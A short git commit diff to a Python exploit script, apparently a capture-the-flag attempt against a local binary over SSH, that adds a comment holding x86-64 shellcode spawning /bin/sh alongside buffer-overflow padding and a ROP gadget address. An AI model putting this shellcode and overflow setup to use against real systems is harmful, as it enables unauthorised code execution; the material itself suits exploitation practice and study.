a376aeac7b497ed72c9296e89cf947682d6bf645
clem9669 <user@localhost.localdomain>
2019-06-12 13:20:50 +0200

    azer

--- 2-defi-ssh/tentative-1.py
+++ 2-defi-ssh/tentative-1.py
@@ -24,10 +24,10 @@ def start():
     p = process('./prog.bin')
     wait("login")
 
-
+# sheelcode : bin/sh \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05
 pr = 0x0000000000400a13  #: pop ebx ; ret
 
-padding="a"*56
+padding="a"*56 # 
 start()
 ropchain="salut" #login
 p.sendline(ropchain)
